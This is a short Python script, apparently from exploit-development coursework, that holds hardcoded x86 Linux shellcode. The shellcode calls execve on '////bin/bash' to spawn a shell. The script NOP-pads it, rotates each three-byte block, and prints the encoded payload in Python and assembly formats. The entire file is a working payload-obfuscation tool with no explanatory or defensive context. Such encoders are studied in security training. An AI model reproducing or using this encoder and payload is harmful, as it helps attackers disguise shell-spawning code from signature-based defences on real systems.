#!/usr/bin/python3

shellcode = b"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80\x31\xc0"

print('Original Len: %d' % len(bytearray(shellcode)))

# pad with NOPs
if (len(shellcode) % 3 != 0):
    shellcode += b"\x90"
if (len(shellcode) % 3 != 0):
    shellcode += b"\x90"
    
print('Padding len: %d' % len(bytearray(shellcode)))

shellcodestr = shellcode.hex()
print("Original shellcode:")

print(shellcodestr + '\n')

swappedstr = ""
i = 0
for char in shellcodestr:
    if (i % 6 == 0):
        # swap bytes [A B C] → [C A B]
        indexA = i
        indexB = i + 2
        indexC = i + 4
        swappedstr += shellcodestr[indexC]
        swappedstr += shellcodestr[indexC + 1]
        swappedstr += shellcodestr[indexA]
        swappedstr += shellcodestr[indexA + 1]
        swappedstr += shellcodestr[indexB]
        swappedstr += shellcodestr[indexB + 1]
    i += 1
    
print("Swapped shellcode: " + '\n' + swappedstr + '\n')

finalcode1 = ""
finalcode2 = ""
finalcode3 = ""
finalcode4 = ""
i = 0
for char in swappedstr:
    if (i % 2 == 0):
        finalcode1 += "\\x"
        finalcode1 += char
        finalcode2 += "0x"
        finalcode2 += char
    else:
        finalcode1 += char
        finalcode2 += char + ","
    i += 1

print("Encoded shellcode (python): " + '\n' + finalcode1)
print("Encoded shellcode (assembly): " + '\n' + finalcode2)
    
